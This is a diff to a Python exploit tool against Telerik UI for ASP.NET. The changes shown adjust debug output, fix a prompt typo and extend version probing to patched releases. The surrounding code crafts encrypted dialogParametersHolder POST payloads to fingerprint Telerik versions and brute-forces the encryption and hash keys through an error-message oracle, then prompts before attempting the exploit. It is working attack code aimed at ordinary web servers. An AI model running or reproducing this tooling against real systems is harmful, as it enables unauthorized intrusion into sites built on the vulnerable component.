@@ -331,7 +331,6 @@ class DialogHandler:
         self.include_machinekeys_bool = include_machinekeys_bool
 
     def probe_version(self, version):
-        print("IN PROBE VERSION!")
         b64section_plain = f"Telerik.Web.UI.Editor.DialogControls.DocumentManagerDialog, Telerik.Web.UI, Version={version}, Culture=neutral, PublicKeyToken=121fae78165ba3d4"
         b64section = base64.b64encode(b64section_plain.encode()).decode()
         plaintext = f"EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;EnableEmbeddedBaseStylesheet,False,3,True;RenderMode,False,2,2;UploadPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,204800;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;IsSkinTouch,False,3,False;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,{b64section};AllowMultipleSelection,False,3,False"
@@ -344,6 +343,8 @@ class DialogHandler:
         r = requests.post(
             self.url, data=dialog_parameters_data, headers=self.headers, verify=False, proxies=self.proxies
         )
+        if r.status_code != 500:
+            print(version)
         if r.status_code == 200:
             return dialog_parameters
 
@@ -443,6 +444,7 @@ class DialogHandler:
                     data = {"dialogParametersHolder": encryption_key_probe}
                     res = requests.post(self.url, data=data, proxies=self.proxies, headers=self.headers, verify=False)
                     if "Index was outside the bounds of the array" in res.text:
+
                         print(f"Found Encryption key! [{encryption_key}]")
                         print(f"Found matching hashkey! [{hash_key}]")
 
@@ -466,7 +468,7 @@ class DialogHandler:
         )
 
         versions = []
-        for v in telerik_versions:
+        for v in telerik_versions + telerik_versions_patched:
             versions.append(v)
         undotted_versions = []
         for v in telerik_versions:
@@ -476,7 +478,6 @@ class DialogHandler:
         for version in versions:
             dialog_parameters = self.probe_version(version)
             if dialog_parameters:
-                print("GOT IT!")
                 self.version = version
                 self.dialog_parameters = dialog_parameters
                 return True
@@ -554,7 +555,7 @@ def main():
                 include_machinekeys_bool=include_machinekeys_bool,
             )
             rau.version_probe()
-            response = input("Ready attempt exploit, press enter to continue...")
+            response = input("Ready to attempt exploit, press enter to continue...")
             print(response)
             if response.lower() != "":
                 print("aborting...")
@@ -582,7 +583,6 @@ def main():
         dh.detect_derive_function()
         if dh.solve_key():
             print("solved key!!!!!!!")
-            print(dh.solve_version())
             if dh.solve_version():
                 print(f"Found Telerik Version! [{dh.version}]")
                 print("Submit a POST request, with dialogParametersHolder POST parameter set to this value")
